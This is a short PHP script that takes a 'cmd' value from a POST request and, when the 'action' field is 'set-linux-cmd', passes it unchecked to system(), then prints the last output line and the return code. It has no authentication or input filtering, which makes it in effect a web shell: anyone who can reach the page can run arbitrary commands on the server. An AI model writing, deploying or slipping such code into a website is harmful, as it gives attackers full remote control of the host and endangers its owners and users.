<?php
$action=$_POST["action"];
$cmd=$_POST["cmd"];
if($action=="set-linux-cmd"){ 
	$last_line=system($cmd,$res);

	echo '
</pre>
<hr />Last line of the output: ' . $last_line . '
<hr />Return value: ' . $res;	
}
?>